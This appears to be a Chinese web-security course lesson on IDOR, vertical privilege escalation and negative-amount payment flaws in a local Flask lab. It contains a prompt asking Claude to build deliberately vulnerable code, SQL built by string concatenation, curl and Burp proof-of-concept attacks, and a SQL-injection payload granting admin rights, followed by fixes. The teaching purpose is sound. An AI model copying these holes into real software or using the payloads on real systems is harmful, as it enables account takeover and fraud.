# Day 5 - 越权与支付逻辑漏洞

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带越权漏洞的功能：

```
在 Flask 中实现个人中心和充值功能，要求：
1. 用户访问 /profile?user_id=X 查看个人资料
2. 用户可以通过表单修改自己的邮箱和手机号
3. 实现充值功能：/recharge 传入 user_id 和 amount
4. 为了方便测试，user_id 通过 URL 参数传递
5. 充值时直接更新数据库余额，不做额外校验
6. 不需要验证当前登录用户和操作对象是否匹配
```

---

## 二、漏洞关键代码解释

### 漏洞 1：水平越权（IDOR）

```python
# core/user_service.py
def get_user_profile(user_id):
    conn = _get_connection()
    cursor = conn.cursor()
    # ↓↓↓ 漏洞行：user_id 来自客户端，未验证归属
    cursor.execute(f"SELECT id, username, email, phone, role, balance FROM users WHERE id = {user_id}")
    row = cursor.fetchone()
    conn.close()
    return dict(row) if row else None
```

**问题**：
- `user_id` 来自 URL 参数（客户端可控）
- 未验证该 ID 是否属于当前登录用户
- 普通用户可访问管理员信息（`user_id=1`）

**攻击方式**：
```
GET /profile?user_id=1    # admin 的信息
GET /profile?user_id=2    # alice 的信息
GET /profile?user_id=3    # bob 的信息
```

### 漏洞 2：垂直越权

```python
def update_user_profile(user_id, email, phone):
    conn = _get_connection()
    cursor = conn.cursor()
    # ↓↓↓ 未校验当前用户角色，普通用户可修改管理员资料
    cursor.execute(f"UPDATE users SET email = '{email}', phone = '{phone}' WHERE id = {user_id}")
```

**问题**：未校验当前用户的 `role` 是否为 `admin`，普通用户只要知道 admin 的 `user_id=1` 即可修改管理员资料。

### 漏洞 3：支付逻辑漏洞

```python
def process_recharge(user_id, amount):
    conn = _get_connection()
    cursor = conn.cursor()
    # ↓↓↓ 漏洞行：amount 未校验正负
    cursor.execute(f"UPDATE users SET balance = balance + {amount} WHERE id = {user_id}")
```

**问题**：
- `amount` 可以是负数，攻击者可输入 `-10000` 来减少他人余额
- 无幂等校验，同一请求可重复发送
- `amount` 是字符串拼接，还存在 SQL 注入风险

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 攻击示例 |
|------|---------|---------|
| 水平越权 | 未验证资源所有权 | alice 查看 admin 资料 |
| 垂直越权 | 未验证用户角色 | 普通用户修改管理员资料 |
| 支付漏洞 | 未校验金额正负 | 充值 -10000 元 |
| 参数篡改 | 关键参数由客户端传入 | 修改 user_id、amount |

---

## 四、POC 代码

### POC 1：水平越权——查看他人信息

```bash
# 以普通用户 alice 登录
curl http://127.0.0.1:5000/login \
  -d "username=alice&password=alice2025" \
  -c /tmp/cookies_alice.txt

# 越权查看管理员信息
curl "http://127.0.0.1:5000/profile?user_id=1" \
  -b /tmp/cookies_alice.txt | grep "admin\|99999"
```

**预期结果**：alice 可以看到 admin 的用户名、邮箱、余额等信息。

### POC 2：遍历所有用户

```bash
# 用 alice 的 cookie 遍历用户
for i in 1 2 3 4 5; do
  echo "=== user_id=$i ==="
  curl "http://127.0.0.1:5000/profile?user_id=$i" \
    -b /tmp/cookies_alice.txt | grep -oP '(?<=用户名</strong>)[^<]+'
done
```

**预期结果**：alice 可以查看系统中任意用户的信息。

### POC 3：支付负金额

```bash
# 使用 alice 给 admin 充值负金额（扣钱）
curl http://127.0.0.1:5000/recharge \
  -b /tmp/cookies_alice.txt \
  -d "user_id=1&amount=-10000"

# 验证 admin 余额减少
curl "http://127.0.0.1:5000/profile?user_id=1" \
  -b /tmp/cookies_alice.txt | grep "余额"
```

**预期结果**：admin 的余额从 99999 减少到 89999（被扣了 10000）。

---

## 五、POC 代码测试方法（Burp Suite）

### 测试水平越权

1. **登录 alice 账号**（`alice / alice2025`）
2. 访问个人中心，Burp 拦截到请求：
   ```
   GET /profile?user_id=2 HTTP/1.1
   Cookie: session=...
   ```
3. 发送到 Repeater
4. 修改 `user_id=2` 为 `user_id=1`
5. 发送——看到 admin 的资料

### 测试支付漏洞

1. **拦截充值请求**
   ```
   POST /recharge HTTP/1.1
   user_id=2&amount=100
   ```
2. 修改 `amount=100` 为 `amount=-10000`
3. 发送请求
4. 返回个人中心查看余额变化

### 自动化越权检测

```bash
# 批量测试越权
for uid in 1 2 3 4 5 6 7 8 9 10; do
  STATUS=$(curl -o /dev/null -s -w "%{http_code}" \
    "http://127.0.0.1:5000/profile?user_id=$uid" \
    -b /tmp/cookies_alice.txt)
  echo "user_id=$uid → HTTP $STATUS"
done
```

---

## 六、POC 代码详细解释

### POC 1 详解

```bash
curl "http://127.0.0.1:5000/profile?user_id=1"
```

**攻击链分析**：
```
正常访问（user_id=2，alice自己的资料）：
  /profile?user_id=2
  → 数据库查询 WHERE id=2
  → 返回 alice 的信息  ← 正常

越权访问（user_id=1，admin的资料）：
  /profile?user_id=1
  → 数据库查询 WHERE id=1
  → 返回 admin 的信息  ← 越权！alice 不应该看到 admin 的信息
```

**为什么后端没拦住？**
```
用户请求 → 检查登录态 → 通过（已登录）
        → 取 URL 参数 user_id → 直接查数据库
        → 返回结果
        → ❌ 没有检查：当前登录用户 (alice) 是否等于 user_id (admin)
```

正确的逻辑应该是：
```
用户请求 → 检查登录态
        → 如果 user_id 不是当前用户 → 拒绝！
        → 查数据库 → 返回
```

### POC 3 详解

```bash
curl ... -d "user_id=1&amount=-10000"
```

**攻击链分析**：

1. 开发者预期 `amount` 总是正数（充值是加钱）
2. 但实际 SQL 执行：`UPDATE users SET balance = balance + (-10000) WHERE id = 1`
3. 结果：admin 的余额减少了 10000 元

**更严重的攻击变种**：
```
# 给自己充负值（余额可能变负数，造成系统混乱）
amount=-999999

# 利用浮点数精度
amount=0.01-0.001

# SQL 注入 + 支付组合
amount=-10000; UPDATE users SET role='admin' WHERE id=2 --
```

---

## 七、修复方案

```python
# fix/user_service_fix.py

def get_user_profile_fixed(user_id, current_user_id, current_user_role):
    """修复：验证资源所有权"""
    # 修复 1：检查权限——只有管理员或本人可查看
    if user_id != current_user_id and current_user_role != 'admin':
        return None  # 拒绝访问

    conn = _get_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT ... FROM users WHERE id = ?", (user_id,))
    ...

def process_recharge_fixed(user_id, amount, current_user_id):
    """修复：验证金额和身份"""
    # 修复 1：只能给自己充值
    if user_id != current_user_id:
        return {"success": False, "message": "不能为他人充值"}

    # 修复 2：金额必须为正数
    try:
        amount = float(amount)
    except ValueError:
        return {"success": False, "message": "金额格式错误"}

    if amount <= 0:
        return {"success": False, "message": "金额必须为正数"}

    # 修复 3：金额上限
    if amount > 100000:
        return {"success": False, "message": "单次充值不能超过10万元"}

    # 修复 4：使用参数化查询
    conn = _get_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = balance + ? WHERE id = ?",
                   (amount, user_id))
    ...
```

---

## 八、课后作业

1. 在 `fix/` 目录创建 `user_service_fix.py`，实现权限校验修复
2. 修改 `app.py`，将当前登录用户的 `user_id` 和 `role` 传入修复函数
3. 验证：
   - alice 能否查看 admin 的资料？→ 应该被拒绝
   - alice 能否给 admin 充值？→ 应该被拒绝
   - 负金额充值是否被拦截？→ 应该被拒绝
4. （进阶）设计一个完整的权限校验中间件函数
5. 思考：即使修复了越权，代码中是否还存在 SQL 注入问题？
